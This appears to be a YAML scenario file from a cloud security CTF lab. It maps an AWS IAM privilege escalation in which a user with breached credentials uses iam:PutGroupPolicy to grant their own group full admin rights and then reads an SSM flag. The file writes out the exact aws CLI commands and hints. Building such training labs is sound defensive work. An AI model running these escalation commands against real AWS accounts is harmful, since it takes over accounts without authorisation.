attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-011-to-admin-paul"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PutGroupPolicy permission scoped to the group they are
        a member of, enabling them to add an inline admin policy to their own group
        and escalate themselves to administrator access.

    - id: escalation-group
      label: "Escalation Group"
      type: resource
      subType: iam-group
      arn: "arn:aws:iam::{account_id}:group/pl-prod-iam-011-to-admin-escalation-group"
      description: >
        This IAM group contains pl-prod-iam-011-to-admin-paul as a member. By adding
        an inline admin policy to this group, any attached permissions are immediately
        inherited by all group members, including the attacker.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-011-to-admin"

  edges:
    - from: starting-principal
      to: escalation-group
      label: "iam:PutGroupPolicy"
      description: >
        Add an inline policy granting AdministratorAccess to the group. Because the
        attacker is a member of this group, they immediately inherit the new permissions.
      hints:
        - "Write an inline policy onto the group your user belongs to using iam:PutGroupPolicy granting the permissions you need -- group policy changes take effect without re-issuing credentials, no credential refresh needed."
        - "Wait 15 seconds for IAM to propagate the inline policy, then verify the escalation by calling a previously-denied API such as iam:ListUsers."
        - "Browse to https://pathfinding.cloud/paths/iam-011 for technique details."
      commands:
        - description: "Add an inline admin policy to the escalation group"
          command: >
            aws iam put-group-policy
            --group-name pl-prod-iam-011-to-admin-escalation-group
            --policy-name EscalatedAdminAccess
            --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
        - description: "Verify admin access by listing IAM users"
          command: "aws iam list-users --max-items 3 --output table"

    - from: escalation-group
      to: starting-principal
      label: "Group membership"
      description: >
        Group membership causes the new inline policy to be applied to the user,
        granting them administrator access to the account.
      hints: []
      commands: []

    - from: starting-principal
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With AdministratorAccess now effective through group membership, the starting user
        can read the CTF flag stored in SSM Parameter Store.
      hints:
        - "Use ssm:GetParameter with the parameter name /pathfinding-labs/flags/iam-011-to-admin to retrieve the flag -- AdministratorAccess inherited through group membership covers this call."
      commands:
        - description: "Read the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/iam-011-to-admin --query 'Parameter.Value' --output text"
